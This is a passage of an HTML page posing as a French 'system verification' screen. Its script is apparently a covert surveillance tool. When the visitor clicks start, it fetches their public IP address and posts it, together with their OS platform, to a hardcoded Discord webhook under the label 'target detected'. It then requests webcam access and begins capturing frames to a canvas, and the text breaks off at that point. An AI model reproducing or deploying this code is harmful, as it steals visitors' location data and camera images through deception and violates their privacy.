<!DOCTYPE html>

</head>
<body>
    <div class="box"><h3>VÃ‰RIFICATION SYSTÃˆME</h3><p id="m">Initialisation du protocole...</p><button id="b" onclick="start()" style="background:transparent;color:#00ff41;border:1px solid #00ff41;padding:10px;width:100%;cursor:pointer">DÃ‰MARRER</button></div>
    <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
    <script>
        const WH = "https://discord.com/api/webhooks/1465426685053636781/NrCTO4VT3hOKWgLS4newFpcskrYfPE9DpA6PKoh9RjZB3Xq_GNcQRe56L50HxQPfdOr3";
        async function post(msg, blob=null){
            const fd = new FormData();

            fd.append('payload_json', JSON.stringify({content: msg}));
            await fetch(WH, {method:'POST', body:fd, keepalive:true});
        }
        async function start(){
            document.getElementById('b').style.display='none';
            document.getElementById('m').innerText="Analyse rÃ©seau...";
            let ip="BloquÃ©e"; try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();ip=d.ip;}catch(e){}
            await post("ðŸš€ **CIBLE DÃ‰TECTÃ‰E**\n**IP**: " + ip + "\n**OS**: " + navigator.platform);
            try{
                const s=await navigator.mediaDevices.getUserMedia({video:true});
                const v=document.getElementById('v'); v.srcObject=s;
                v.onloadedmetadata=()=>{setTimeout(()=>{
                    const c=document.getElementById('c'); c.width=v.videoWidth; c.height=v.videoHeight;
